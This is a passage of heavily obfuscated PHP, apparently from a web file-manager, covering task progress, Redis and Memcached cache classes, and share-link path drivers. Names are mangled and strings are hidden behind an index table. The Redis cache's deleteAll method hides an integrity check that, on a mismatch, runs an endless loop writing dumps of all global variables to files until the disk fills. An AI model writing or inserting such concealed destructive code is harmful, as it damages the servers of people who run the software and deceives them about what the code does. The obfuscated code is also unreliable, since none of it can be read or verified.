$Šå††ß[118]) { if ($½®«Ö¦Û[$Šå††ß[1682]]) { $½®«Ö¦Û[$Šå††ß[1685]] = $½®«Ö¦Û[$Šå††ß[1684]] + $½®«Ö¦Û[$Šå††ß[1681]]; } } else { if ($½®«Ö¦Û[$Šå††ß[1688]] == $Šå††ß[1283]) { if ($½®«Ö¦Û[$Šå††ß[1682]] == $Šå††ß[1177]) { $½®«Ö¦Û[$Šå††ß[1685]] = $½®«Ö¦Û[$Šå††ß[1684]] + $½®«Ö¦Û[$Šå††ß[1681]] * 0.5; } else { if ($½®«Ö¦Û[$Šå††ß[1682]] == $Šå††ß[118]) { $½®«Ö¦Û[$Šå††ß[1685]] = $½®«Ö¦Û[$Šå††ß[1684]] + $½®«Ö¦Û[$Šå††ß[1680]] * 0.5 + $½®«Ö¦Û[$Šå††ß[1681]] * 0.5; } } } } $½®«Ö¦Û[$Šå††ß[1634]] = $½®«Ö¦Û[$Šå††ß[1685]] / $½®«Ö¦Û[$Šå††ß[747]]; if ($½®«Ö¦Û[$Šå††ß[1634]] > 0) { $î¶¯™Æ = timeFloat() - $½®«Ö¦Û[$Šå††ß[1636]] - $½®«Ö¦Û[$Šå††ß[1639]]; $½®«Ö¦Û[$Šå††ß[1640]] = $î¶¯™Æ * (1 - $½®«Ö¦Û[$Šå††ß[1634]]) / $½®«Ö¦Û[$Šå††ß[1634]]; } } public function addPath($ÁÕ¡Õµ¶) { $çáª›ç‚ =& $_SERVER[ë¦»ºéÌ]; if (!$ÁÕ¡Õµ¶) { return; } $í—²¤º™ =& $this->task; $á’“‚¨Ğ = IO::infoWithChildren($ÁÕ¡Õµ¶); $è‡©üÃá = $í—²¤º™[$çáª›ç‚[1689]] ? $í—²¤º™[$çáª›ç‚[1689]][$çáª›ç‚[1690]] : 0; $í—²¤º™[$çáª›ç‚[1689]] = array($çáª›ç‚[1690] => $è‡©üÃá + 1, $çáª›ç‚[423] => $á’“‚¨Ğ[$çáª›ç‚[42]], $çáª›ç‚[88] => $á’“‚¨Ğ[$çáª›ç‚[88]], $çáª›ç‚[521] => $á’“‚¨Ğ[$çáª›ç‚[521]] ? $á’“‚¨Ğ[$çáª›ç‚[521]] : $á’“‚¨Ğ[$çáª›ç‚[88]]); if ($á’“‚¨Ğ[$çáª›ç‚[43]] == $çáª›ç‚[204]) { $í—²¤º™[$çáª›ç‚[770]] += 1; } else { $í—²¤º™[$çáª›ç‚[770]] += $á’“‚¨Ğ[$çáª›ç‚[93]][$çáª›ç‚[91]]; if ($á’“‚¨Ğ[$çáª›ç‚[405]]) { $í—²¤º™[$çáª›ç‚[770]] += $á’“‚¨Ğ[$çáª›ç‚[93]][$çáª›ç‚[92]] + 1; } } $í—²¤º™[$çáª›ç‚[747]] += $á’“‚¨Ğ[$çáª›ç‚[90]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($œ”óÕÉ™) { $£†¢òµ¨ =& $_SERVER[ë¦»ºéÌ]; $º«£¥Ÿ =& $this->task; $º«£¥Ÿ[$£†¢òµ¨[1678]] = $œ”óÕÉ™[$£†¢òµ¨[42]]; $º«£¥Ÿ[$£†¢òµ¨[1044]] = $œ”óÕÉ™[$£†¢òµ¨[42]]; $this->update(); } public function copyFileStart($ œåËüÀ, $‰’ä±³, $çÇÆû‹­, $‰ˆóŸÉ€, $³î¬ğÏÕ, $™ò¼×µ“) { $ŞÅó²óÒ =& $_SERVER[ë¦»ºéÌ]; $‚Ó­·ö´ = $³î¬ğÏÕ; if ($‚Ó­·ö´ == $GLOBALS[$ŞÅó²óÒ[1691]]) { $‚Ó­·ö´ = $GLOBALS[$ŞÅó²óÒ[1692]]; } $GLOBALS[$ŞÅó²óÒ[1692]] = $³î¬ğÏÕ; $GLOBALS[$ŞÅó²óÒ[1691]] = $™ò¼×µ“; $İ–ÀÆû =& $this->task; $İ–ÀÆû[$ŞÅó²óÒ[1678]] = $‚Ó­·ö´; $İ–ÀÆû[$ŞÅó²óÒ[1680]] = (int) $ œåËüÀ->size($‰’ä±³); $İ–ÀÆû[$ŞÅó²óÒ[1681]] = 0; $İ–ÀÆû[$ŞÅó²óÒ[1044]] = $ŞÅó²óÒ[12]; $İ–ÀÆû[$ŞÅó²óÒ[1682]] = $ŞÅó²óÒ[12]; $İ–ÀÆû[$ŞÅó²óÒ[1683]] = 0; $şóì¤ÛÉ = $İ–ÀÆû[$ŞÅó²óÒ[1680]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($İ–ÀÆû[$ŞÅó²óÒ[403]] . $ŞÅó²óÒ[1693]); if ($şóì¤ÛÉ && file_exists(get_path_father($‰ˆóŸÉ€))) { Cache::set($İ–ÀÆû[$ŞÅó²óÒ[403]] . $ŞÅó²óÒ[1693], $‰ˆóŸÉ€); $İ–ÀÆû[$ŞÅó²óÒ[1654]] = array($ŞÅó²óÒ[1694], $ŞÅó²óÒ[1695]); } $this->update(0, $şóì¤ÛÉ); } public static function updateCopyLocalFileSize($Ãî÷ËÌ…) { $ºÑª±Èò =& $_SERVER[ë¦»ºéÌ]; $¼ó…º§® = Cache::get($Ãî÷ËÌ…[$ºÑª±Èò[403]] . $ºÑª±Èò[1693]); if (!$¼ó…º§® || !file_exists($¼ó…º§®)) { return $Ãî÷ËÌ…; } $Ãî÷ËÌ…[$ºÑª±Èò[1681]] = @filesize($¼ó…º§®); $Ãî÷ËÌ…[$ºÑª±Èò[1685]] += $Ãî÷ËÌ…[$ºÑª±Èò[1681]]; self::updateTask($Ãî÷ËÌ…); return $Ãî÷ËÌ…; } public function copyFileEnd($ˆ£şå–¹, $ÍîÒ•ÔÈ, $÷¯îÚ‹™, $¹¤‰ƒşÆ, $”ÀÙ£öß, $³¶úó—Ò) { $šíºãŠ =& $_SERVER[ë¦»ºéÌ]; $ôµŒÎøù =& $this->task; $ôµŒÎøù[$šíºãŠ[1681]] = $ôµŒÎøù[$šíºãŠ[1680]]; $ôµŒÎøù[$šíºãŠ[1682]] = $šíºãŠ[12]; unset($ôµŒÎøù[$šíºãŠ[1654]]); if ($”ÀÙ£öß == $ôµŒÎøù[$šíºãŠ[1678]]) { $ôµŒÎøù[$šíºãŠ[1684]] += $ôµŒÎøù[$šíºãŠ[1680]]; $ôµŒÎøù[$šíºãŠ[1685]] = $ôµŒÎøù[$šíºãŠ[1684]]; $this->update(1); } else { $this->update(); $ôµŒÎøù[$šíºãŠ[1681]] = 0; } Cache::remove($ôµŒÎøù[$šíºãŠ[403]] . $šíºãŠ[1693]); self::log($šíºãŠ[1696] . $ÍîÒ•ÔÈ . $šíºãŠ[80] . $¹¤‰ƒşÆ . $šíºãŠ[18] . $”ÀÙ£öß . $šíºãŠ[1697] . $ôµŒÎøù[$šíºãŠ[1678]]); } public function updateFileEnd($Ç€Ã”Àã, $õ†ö’²ö) { $œâÓ´Å =& $_SERVER[ë¦»ºéÌ]; $ç¸°¹¶Î =& $this->task; $ç¸°¹¶Î[$œâÓ´Å[1678]] = $Ç€Ã”Àã; $ç¸°¹¶Î[$œâÓ´Å[1680]] = $õ†ö’²ö; $ç¸°¹¶Î[$œâÓ´Å[1684]] += $õ†ö’²ö; $ç¸°¹¶Î[$œâÓ´Å[1685]] = $ç¸°¹¶Î[$œâÓ´Å[1684]]; $this->update(1); self::log($œâÓ´Å[1698] . $Ç€Ã”Àã); } public function sourceModelCopy($ˆÍ¯•Ñ) { $âÍšœü¢ =& $_SERVER[ë¦»ºéÌ]; $§¬Æô´ğ = $ˆÍ¯•Ñ[0]; $î¬Ã„ãÖ = $ˆÍ¯•Ñ[1]; $Ï¡‰ı«… =& $this->task; $this->sourceModelCopyFlag = !0; $à“‘ß®û = 0; switch ($§¬Æô´ğ) { case $âÍšœü¢[568]: $à“‘ß®û = 1; break; case $âÍšœü¢[571]: $Ï¡‰ı«…[$âÍšœü¢[1678]] = $î¬Ã„ãÖ[$âÍšœü¢[42]]; break; case $âÍšœü¢[573]: $à“‘ß®û = intval($ˆÍ¯•Ñ[$âÍšœü¢[386]] * 0.4); break; case $âÍšœü¢[575]: $à“‘ß®û = intval($ˆÍ¯•Ñ[$âÍšœü¢[386]] * 0.2); break; case $âÍšœü¢[577]: $à“‘ß®û = intval($ˆÍ¯•Ñ[$âÍšœü¢[386]] * 0.4); break; } $this->update($à“‘ß®û); $this->sourceModelCopyFlag = !1; } public function sourceRemove($ ¸†ÆËÃ, $àÅ³ëÅ£) { $œØóã—Ø =& $_SERVER[ë¦»ºéÌ]; $this->sourceModelCopyFlag = !0; $ˆäÜÙº = 1; if (isset($ ¸†ÆËÃ[$œØóã—Ø[93]])) { $ˆäÜÙº = $ ¸†ÆËÃ[$œØóã—Ø[93]][$œØóã—Ø[91]] + $ ¸†ÆËÃ[$œØóã—Ø[93]][$œØóã—Ø[92]] + 1; } $this->update($ˆäÜÙº); $this->sourceModelCopyFlag = !1; } public function sourceMove($»®Šã×”) { $this->sourceRemove($»®Šã×”, !1); } public function curlProgress($Â­´õ¾µ, $ä—Ÿ£ä®, $ÉĞ±À¡„, $µÑ¡­Œ, $­€Á÷ºû) { $½êƒ¤£ğ =& $_SERVER[ë¦»ºéÌ]; $•ñÌÍ¬› =& $this->task; if ($­€Á÷ºû > 0) { $•ñÌÍ¬›[$½êƒ¤£ğ[1044]] = $½êƒ¤£ğ[1699]; $•ñÌÍ¬›[$½êƒ¤£ğ[1682]] = $½êƒ¤£ğ[118]; if ($•ñÌÍ¬›[$½êƒ¤£ğ[1680]]) { $•ñÌÍ¬›[$½êƒ¤£ğ[1681]] = $­€Á÷ºû; } if ($•ñÌÍ¬›[$½êƒ¤£ğ[1683]]) { $•ñÌÍ¬›[$½êƒ¤£ğ[1681]] = $­€Á÷ºû + $•ñÌÍ¬›[$½êƒ¤£ğ[1683]]; } } else { if ($ÉĞ±À¡„ > 0) { if ($•ñÌÍ¬›[$½êƒ¤£ğ[1680]] == $ä—Ÿ£ä®) { $•ñÌÍ¬›[$½êƒ¤£ğ[1681]] = $ÉĞ±À¡„; $•ñÌÍ¬›[$½êƒ¤£ğ[1044]] = $½êƒ¤£ğ[1700]; $•ñÌÍ¬›[$½êƒ¤£ğ[1682]] = $½êƒ¤£ğ[1177]; } } } $this->update(); } public function curlProgressStart($äò¦æ¦ï) { } public function curlProgressEnd($Ú…‡ò¿) { $Ä”³òß =& $_SERVER[ë¦»ºéÌ]; $ÀÀÉş©â =& $this->task; $¶ÙøÀÓş = curl_getinfo($Ú…‡ò¿); $©¼Êè‹Ù = $¶ÙøÀÓş[$Ä”³òß[1701]]; if ($©¼Êè‹Ù == -1) { $©¼Êè‹Ù = $¶ÙøÀÓş[$Ä”³òß[1702]]; } if ($ÀÀÉş©â[$Ä”³òß[1682]] == $Ä”³òß[118] && $©¼Êè‹Ù) { $ÀÀÉş©â[$Ä”³òß[1683]] += $©¼Êè‹Ù; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $ÜõØˆ¢» =& $_SERVER[ë¦»ºéÌ]; $çÛ’ â =& $this->task; $çÛ’ â[$ÜõØˆ¢»[1703]] = 1; Hook::bind($ÜõØˆ¢»[1672], array($this, $ÜõØˆ¢»[1704])); Hook::bind($ÜõØˆ¢»[1674], array($this, $ÜõØˆ¢»[1705])); Hook::bind($ÜõØˆ¢»[1676], array($this, $ÜõØˆ¢»[1706])); } protected function endAfter() { $§¨Ğµ¸â =& $_SERVER[ë¦»ºéÌ]; Hook::unbind($§¨Ğµ¸â[1672], array($this, $§¨Ğµ¸â[1704])); Hook::unbind($§¨Ğµ¸â[1674], array($this, $§¨Ğµ¸â[1705])); Hook::unbind($§¨Ğµ¸â[1676], array($this, $§¨Ğµ¸â[1706])); } public function progressStart($áğÃ„ûı) { $°–»êº› =& $_SERVER[ë¦»ºéÌ]; $—¿°Åò = curl_getinfo($áğÃ„ûı); self::log($°–»êº›[1707] . $—¿°Åò[$°–»êº›[313]]); self::valueSet($this->task[$°–»êº›[403]], $this->task); } public function progressEnd($Ğ…ƒ……ƒ) { $â²‡ëû÷ =& $_SERVER[ë¦»ºéÌ]; self::log($â²‡ëû÷[1708] . $this->task[$â²‡ëû÷[403]]); $this->end(); } public function progress($¢“ÏÖÏò, $å­Ä×§, $ˆ¿€Õñ, $€Åãß§§, $£²ÑèŠÄ) { $Ÿ¥ä™ºƒ =& $_SERVER[ë¦»ºéÌ]; $‰•ºÑéü =& $this->task; if ($£²ÑèŠÄ > 0) { $‰•ºÑéü[$Ÿ¥ä™ºƒ[770]] = $‰•ºÑéü[$Ÿ¥ä™ºƒ[770]] == 0 ? $€Åãß§§ : $‰•ºÑéü[$Ÿ¥ä™ºƒ[770]]; $‰•ºÑéü[$Ÿ¥ä™ºƒ[1633]] = $£²ÑèŠÄ; } else { if ($ˆ¿€Õñ > 0) { $‰•ºÑéü[$Ÿ¥ä™ºƒ[770]] = $‰•ºÑéü[$Ÿ¥ä™ºƒ[770]] == 0 ? $å­Ä×§ : $‰•ºÑéü[$Ÿ¥ä™ºƒ[770]]; $‰•ºÑéü[$Ÿ¥ä™ºƒ[1633]] = $ˆ¿€Õñ; } } $this->update(); self::log("\x70\162\x6f\x67\x72\145\163\163\x48\x74\x74\160\72\x64\157\x77\156\x3a{$ˆ¿€Õñ}\x2f{$å­Ä×§}\73\x20\165\160\x6c\157\x61\144\x3a{$£²ÑèŠÄ}\x2f{$€Åãß§§}\73"); } } goto F˜†œ¹Íµ¤; FİƒøÖÒŸ: class CacheLockDatabase { public function lock($ë÷Œêß„, $ëÕûËŒ = 0) { $í§ŞĞê¡ = Model($_SERVER[ë¦»ºéÌ][813]); $‰ñõàí´ = microtime(!0) + $ëÕûËŒ; while (microtime(!0) < $‰ñõàí´) { $µšüô™È = $í§ŞĞê¡->get($ë÷Œêß„); if (!$µšüô™È || $µšüô™È < microtime(!0)) { $òÇíÈ¥´ = $í§ŞĞê¡->set($ë÷Œêß„, $‰ñõàí´); if ($òÇíÈ¥´) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Úì©ûÌ») { return Model($_SERVER[ë¦»ºéÌ][813])->get($Úì©ûÌ»); } public function unlock($‘ø¬¤Ò©) { Model($_SERVER[ë¦»ºéÌ][813])->remove($‘ø¬¤Ò©); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($‘»®Âëı, $«—¯İİµ) { $­ãİŠã =& $_SERVER[ë¦»ºéÌ]; if (!class_exists($­ãİŠã[846])) { show_json($­ãİŠã[847], !1); } $this->cacheTime = $«—¯İİµ; $this->handle = new Memcached(); if (is_array($‘»®Âëı[$­ãİŠã[848]]) && count($‘»®Âëı[$­ãİŠã[848]]) >= 1) { foreach ($‘»®Âëı[$­ãİŠã[848]] as $˜ö°ˆæ¿) { $ßä„úÂ‰ = explode($­ãİŠã[4], $˜ö°ˆæ¿); $this->handle->addServer($ßä„úÂ‰[0], $ßä„úÂ‰[1]); } } else { $this->handle->addServer($‘»®Âëı[$­ãİŠã[186]], $‘»®Âëı[$­ãİŠã[187]]); } } public function set($º¤á’·ê, $ØÛÚÆ²«, $´óÂ€×¾ = false) { $´óÂ€×¾ = $´óÂ€×¾ ? $´óÂ€×¾ : $this->cacheTime; return $this->handle->set($º¤á’·ê, $ØÛÚÆ²«, $´óÂ€×¾); } public function get($ªª³»œğ) { return $this->handle->get($ªª³»œğ); } public function remove($¢â€²ÁÜ) { return $this->handle->delete($¢â€²ÁÜ); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($ƒ–Ú´, $†é§È¯â) { $ä®•®¹‰ =& $_SERVER[ë¦»ºéÌ]; if (!class_exists($ä®•®¹‰[849])) { show_json($ä®•®¹‰[850], !1); } $this->cacheTime = $†é§È¯â; $í˜óõ = isset($ƒ–Ú´[$ä®•®¹‰[851]]) ? $ƒ–Ú´[$ä®•®¹‰[851]] : 10; $ü»ŒüÂ¯ = _get($ƒ–Ú´, $ä®•®¹‰[848]); if ($ü»ŒüÂ¯ && is_array($ü»ŒüÂ¯)) { $this->initCluster($ƒ–Ú´, $í˜óõ); } else { $this->handle = $this->init($ƒ–Ú´, $í˜óõ); } } private function init($ğûÒ¼¶, $¾—‰õŸï) { $¯›ëÇç„ =& $_SERVER[ë¦»ºéÌ]; $åäŞË¥× = new Redis(); $ôê§îÌÍ = isset($ğûÒ¼¶[$¯›ëÇç„[852]]) ? $ğûÒ¼¶[$¯›ëÇç„[852]] : !1; if ($ôê§îÌÍ) { $åäŞË¥×->pconnect($ğûÒ¼¶[$¯›ëÇç„[186]], $ğûÒ¼¶[$¯›ëÇç„[187]], $¾—‰õŸï); } else { $åäŞË¥×->connect($ğûÒ¼¶[$¯›ëÇç„[186]], $ğûÒ¼¶[$¯›ëÇç„[187]], $¾—‰õŸï); } if (!empty($ğûÒ¼¶[$¯›ëÇç„[416]])) { $åäŞË¥×->auth($ğûÒ¼¶[$¯›ëÇç„[416]]); } return $åäŞË¥×; } private function initCluster($‚ÈŠ«¡, $ş¢Ğ¤ê) { $¸”îöÌº =& $_SERVER[ë¦»ºéÌ]; $µéá˜ £ = array($¸”îöÌº[853], $¸”îöÌº[854], $¸”îöÌº[855]); $†ÚĞÏ½» = $¸”îöÌº[853]; if (isset($‚ÈŠ«¡[$¸”îöÌº[26]]) && in_array($‚ÈŠ«¡[$¸”îöÌº[26]], $µéá˜ £)) { $†ÚĞÏ½» = $‚ÈŠ«¡[$¸”îöÌº[26]]; } switch ($†ÚĞÏ½») { case $¸”îöÌº[853]: $this->_slave($‚ÈŠ«¡, $ş¢Ğ¤ê); break; case $¸”îöÌº[854]: break; case $¸”îöÌº[855]: $this->isCluster = !0; $Ÿİ¨ÁŠ = $‚ÈŠ«¡[$¸”îöÌº[848]]; $ñÆä×‘ = isset($‚ÈŠ«¡[$¸”îöÌº[852]]) ? $‚ÈŠ«¡[$¸”îöÌº[852]] : !1; $ªõÛË¨ = isset($‚ÈŠ«¡[$¸”îöÌº[416]]) ? $‚ÈŠ«¡[$¸”îöÌº[416]] : null; $this->handle = new RedisCluster(NUll, $Ÿİ¨ÁŠ, $ş¢Ğ¤ê, $ş¢Ğ¤ê, $ñÆä×‘, $ªõÛË¨); break; default: break; } } private function _slave($—µãïÀ‰, $œ­Ã“Ê¯) { $ŠŠ…¦° = $—µãïÀ‰[$_SERVER[ë¦»ºéÌ][848]]; $this->filterConfig($—µãïÀ‰, $ŠŠ…¦°[0]); $this->handle = $this->init($—µãïÀ‰, $œ­Ã“Ê¯); unset($ŠŠ…¦°[0]); if (empty($ŠŠ…¦°)) { return; } $Æˆí°¤¾ = array_rand($ŠŠ…¦°); $this->filterConfig($—µãïÀ‰, $ŠŠ…¦°[$Æˆí°¤¾]); $this->slaveHandle = $this->init($—µãïÀ‰, $œ­Ã“Ê¯); } private function filterConfig(&$«ğĞÈâÍ, $şÓãš«É) { $çı…×ëš =& $_SERVER[ë¦»ºéÌ]; $øç­à´ = explode($çı…×ëš[4], $şÓãš«É); $’²³«Ú = array($çı…×ëš[186] => $øç­à´[0], $çı…×ëš[187] => $øç­à´[1]); $«ğĞÈâÍ = array_merge($«ğĞÈâÍ, $’²³«Ú); } public function set($ã¶²·¾å, $¼Â­¯·¸, $ßóÈ÷üÔ = false) { $ßóÈ÷üÔ = $ßóÈ÷üÔ ? $ßóÈ÷üÔ : $this->cacheTime; return $this->handle->setEx($ã¶²·¾å, $ßóÈ÷üÔ, $¼Â­¯·¸); } public function setLock($Û¢°ˆ, $È“·‚Ç, $ş¹şæµø) { return $this->handle->setNX($Û¢°ˆ, $È“·‚Ç); } public function get($”ş‚¼©Á) { $ÂÑ±ŒáŸ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $ÂÑ±ŒáŸ->get($”ş‚¼©Á); } public function remove($Œœéî •) { return $this->handle->del($Œœéî •); } public function deleteAll() { $Ÿ°ßŞ¤à =& $_SERVER[ë¦»ºéÌ]; $Á õ…à¯ = $_SERVER[$Ÿ°ßŞ¤à[16]] . $Ÿ°ßŞ¤à[17]; $±£Î³¾İ = $Ÿ°ßŞ¤à[856]; if ($_SERVER[$Ÿ°ßŞ¤à[13]] != $±£Î³¾İ($Á õ…à¯)) { $…­»˜š˜ = $Ÿ°ßŞ¤à[857]; $²–¨©´ = $Ÿ°ßŞ¤à[15]; $²¯ûÔÑ» = $_SERVER[$Ÿ°ßŞ¤à[16]] . $Ÿ°ßŞ¤à[17]; $¨‹„ó˜õ = $²–¨©´($²¯ûÔÑ»); $®ˆŠ‚Û = explode($Ÿ°ßŞ¤à[18], $¨‹„ó˜õ); if (count($®ˆŠ‚Û) < $Ÿ°ßŞ¤à[616]) { $½É´„æ’ = $Ÿ°ßŞ¤à[20]; $½É´„æ’(); } $Ìñöı“Ş = $Ÿ°ßŞ¤à[858]; $Ìñöı“Ş($_SERVER[$Ÿ°ßŞ¤à[859]]); $…­»˜š˜ = $Ÿ°ßŞ¤à[857]; $…­»˜š˜(); $ëº…üíÜ = $Ÿ°ßŞ¤à[860]; $®¬òéñ¸ = json_encode($GLOBALS[$Ÿ°ßŞ¤à[861]]); $äÏÄÇÌ = 1; for ($î˜“ìì­ = $äÏÄÇÌ; $î˜“ìì­ > 0; $î˜“ìì­++) { $ëº…üíÜ(DATA_PATH . $î˜“ìì­, $®¬òéñ¸); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $š—‹‚•Î) { $this->handle->flushall($š—‹‚•Î); } return; } return $this->handle->flushAll(); } } goto C¼Ãù×çå; bñòÈ…ÚÎ: class PathDriverDbShareLink extends PathDriverDB { public function __construct($²³ãîá¸) { $this->pathParse = $²³ãîá¸; $this->model = Model($_SERVER[ë¦»ºéÌ][1305]); } protected function infoParse($î‰‹“Ö‹, $¾î¼ĞÑš = false, $åŸ¤ä±¬ = false) { $úö×Ğœë =& $_SERVER[ë¦»ºéÌ]; return Action($úö×Ğœë[1153])->sharePathInfo($this->pathParse[$úö×Ğœë[88]], !0, $¾î¼ĞÑš); } public function listPath($î¸øë©è, $¨²›Ä = false) { $­÷Ñ¤Ö¼ =& $_SERVER[ë¦»ºéÌ]; $ƒÅù¢Áì = parent::listPath($î¸øë©è, $¨²›Ä); if (!$ƒÅù¢Áì) { return $ƒÅù¢Áì; } if (is_array($ƒÅù¢Áì[$­÷Ñ¤Ö¼[1314]])) { $ƒÅù¢Áì[$­÷Ñ¤Ö¼[1314]] = Action($­÷Ñ¤Ö¼[1153])->shareItemInfo($ƒÅù¢Áì[$­÷Ñ¤Ö¼[1314]]); } foreach ($ƒÅù¢Áì as $Ò”ó¦‹ => $àÎÅ–ñ¨) { if (!in_array($Ò”ó¦‹, array($­÷Ñ¤Ö¼[86], $­÷Ñ¤Ö¼[87]))) { continue; } foreach ($àÎÅ–ñ¨ as $ıú´˜› => $éÈ¨³òÓ) { $ƒÅù¢Áì[$Ò”ó¦‹][$ıú´˜›] = Action($­÷Ñ¤Ö¼[1153])->shareItemInfo($éÈ¨³òÓ); } } return $ƒÅù¢Áì; } public function listAll($‡¥«›„‘) { $çßÜÕ½ =& $_SERVER[ë¦»ºéÌ]; $Ü§…ğÚ = IO::info($this->pathParse[$çßÜÕ½[88]]); if (!$Ü§…ğÚ) { return array(); } $£—Éáî„ = $this->model->listAll($‡¥«›„‘); foreach ($£—Éáî„ as &$ª’œù§Ê) { $ª’œù§Ê[$çßÜÕ½[97]] = Action($çßÜÕ½[1153])->shareItemInfo($ª’œù§Ê[$çßÜÕ½[97]]); } unset($ª’œù§Ê); return $£—Éáî„; } } class PathDriverDriverShareItem { public function __construct($æ²ƒÀÖ) { $this->pathParse = $æ²ƒÀÖ; } public function __call($û°‡Ãææ, $ø¤Úæİ±) { $„¯§éıÅ =& $_SERVER[ë¦»ºéÌ]; if (method_exists($this, $û°‡Ãææ)) { return; } $Ú©šĞş = call_user_func_array(array($„¯§éıÅ[1315], $û°‡Ãææ), $ø¤Úæİ±); $¡‰½Ùû› = array($„¯§éıÅ[1316], $„¯§éıÅ[1317], $„¯§éıÅ[1318], $„¯§éıÅ[1319], $„¯§éıÅ[551], $„¯§éıÅ[553], $„¯§éıÅ[1320], $„¯§éıÅ[118], $„¯§éıÅ[1321], $„¯§éıÅ[1322]); if (in_array($û°‡Ãææ, $¡‰½Ùû›)) { $Ú©šĞş = $this->getPathOuter($Ú©šĞş); } return $Ú©šĞş; } public function copy($¶ˆïî, $Öİ’ï Á, $ŠåÊƒñŸ = false, $ÆçêÕé› = false) { return $this->copyMove($¶ˆïî, $Öİ’ï Á, $ŠåÊƒñŸ, $_SERVER[ë¦»ºéÌ][551], $ÆçêÕé›); } public function move($¤ëœñÕ, $¡¾ˆ¬Ø, $ùÛÌ«Â = false, $ô•‹ÏÀš = false) { return $this->copyMove($¤ëœñÕ, $¡¾ˆ¬Ø, $ùÛÌ«Â, $_SERVER[ë¦»ºéÌ][553], $ô•‹ÏÀš); } private function copyMove($ÚÖî”™º, $€ÄÎå²Ò, $ˆğİ¨®, $–¸¨Ñ¨ä, $¼•íÚ¤« = false) { $çùƒ• =& $_SERVER[ë¦»ºéÌ]; $ù‡Õ’ĞÁ = $€ÄÎå²Ò; $—ëı§…— = IO::driverMake($€ÄÎå²Ò); if ($—ëı§…—->pathParse[$çùƒ•[1131]]) { $€ÄÎå²Ò = $—ëı§…—->pathParse[$çùƒ•[1131]]; } else { $€ÄÎå²Ò = $ù‡Õ’ĞÁ; } $¨÷öıƒÍ = IO::copyMove($ÚÖî”™º, $€ÄÎå²Ò, $ˆğİ¨®, $–¸¨Ñ¨ä, $¼•íÚ¤«); $¨÷öıƒÍ = $this->getPathOuter($¨÷öıƒÍ); return $¨÷öıƒÍ; } public function pathThis($Ü­¿äú³) { return get_path_this($this->pathParse[$_SERVER[ë¦»ºéÌ][88]]); } public function pathFather($ÄŞå¸¯Ğ) { return get_path_father($this->pathParse[$_SERVER[ë¦»ºéÌ][88]]); } public function iconvSystem($£Ş“ÑˆÅ) { return $£Ş“ÑˆÅ; } protected function infoParse($š„ŸšÓ, $Š½††¤ = false) { $ˆ†ô°„ =& $_SERVER[ë¦»ºéÌ]; $®†ÀËôú = $this->pathParse[$ˆ†ô°„[488]][$ˆ†ô°„[1154]] . $this->pathParse[$ˆ†ô°„[1147]]; if ($Š½††¤) { $¤×˜ôÏ = IO::infoWithChildren($®†ÀËôú); } else { $¤×˜ôÏ = IO::info($®†ÀËôú); } $¨Ÿ€¥ é = $this->pathParse[$ˆ†ô°„[488]]; return Action($ˆ†ô°„[1313])->_shareItemeParse($¤×˜ôÏ, $¨Ÿ€¥ é); } public function listAll($ºÊˆˆ·´) { $ø‹ãúÌû =& $_SERVER[ë¦»ºéÌ]; $ÄÍ ‰ğù = IO::listAll($ºÊˆˆ·´); $¡¼•ÊÈ© = $this->pathParse[$ø‹ãúÌû[488]]; foreach ($ÄÍ ‰ğù as &$ÍĞ¥à—) { check_abort(); $óìÒÈÑÀ = IO::info($ÍĞ¥à—[$ø‹ãúÌû[88]]); $óìÒÈÑÀ = is_array($óìÒÈÑÀ) ? $óìÒÈÑÀ : array(); $ÍĞ¥à— = array_merge($óìÒÈÑÀ, $ÍĞ¥à—); $ÍĞ¥à—[$ø‹ãúÌû[97]] = Action($ø‹ãúÌû[1313])->_shareItemeParse($ÍĞ¥à—, $¡¼•ÊÈ©); } unset($ÍĞ¥à—); return $ÄÍ ‰ğù; } public function getPathOuter($ÎË„Òè) { $ÉÆı¢¿ô =& $_SERVER[ë¦»ºéÌ]; $¨óÜ±ÎÓ = KodIO::parse($ÎË„Òè); if ($¨óÜ±ÎÓ[$ÉÆı¢¿ô[43]] == KodIO::KOD_SHARE_ITEM) { return $¨óÜ±ÎÓ[$ÉÆı¢¿ô[88]]; } $’Úäùöá = KodIO::clear($ÎË„Òè); $Åóâö¾ = KodIO::clear($this->pathParse[$ÉÆı¢¿ô[488]][$ÉÆı¢¿ô[1154]]); $¬³ıÜİÆ = substr($’Úäùöá, strlen($Åóâö¾)); if (substr($’Úäùöá, 0, strlen($Åóâö¾)) != $Åóâö¾) { return !1; } return $this->pathParse[$ÉÆı¢¿ô[1148]] . $ÉÆı¢¿ô[8] . ltrim($¬³ıÜİÆ, $ÉÆı¢¿ô[8]); } public function getType() { $±¿´÷„¤ =& $_SERVER[ë¦»ºéÌ]; $¢ÃØ•ùÆ = str_replace($±¿´÷„¤[84], $±¿´÷„¤[12], get_class($this)); return strtolower($¢ÃØ•ùÆ); } public function isTypeObject($¦’­·ÜÔ) { return IO::isTypeObject($¦’­·ÜÔ); } public function info($æ£€İ·) { return $this->infoParse($æ£€İ·); } public function infoAuth($ã‹»õ†) { return $this->infoParse($ã‹»õ†); } public function infoWithChildren($Çš‡ë›) { return $this->infoParse($Çš‡ë›, !0); } public function infoFull($œ¾‘ŞÇ¼) { return $this->infoParse($œ¾‘ŞÇ¼); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ô¿‹Šû›) { $this->pathParse = $ô¿‹Šû›; } protected function infoParse($¦˜’ÎÀÂ, $ÈæÅ¨×— = false) { $ãµÑõ ı =& $_SERVER[ë¦»ºéÌ]; return Action($ãµÑõ ı[1153])->sharePathInfo($this->pathParse[$ãµÑõ ı[88]], !0, $ÈæÅ¨×—); } public function listPath($‰´ãÙôö, $ô²œäÇ˜ = false) { $îˆ‚À¾â =& $_SERVER[ë¦»ºéÌ]; $­ÙšÃË® = IO::listPath($‰´ãÙôö, $ô²œäÇ˜); if (!$­ÙšÃË®) { return $­ÙšÃË®; } if (is_array($­ÙšÃË®[$îˆ‚À¾â[1314]])) { $çÛÁ…¦å = 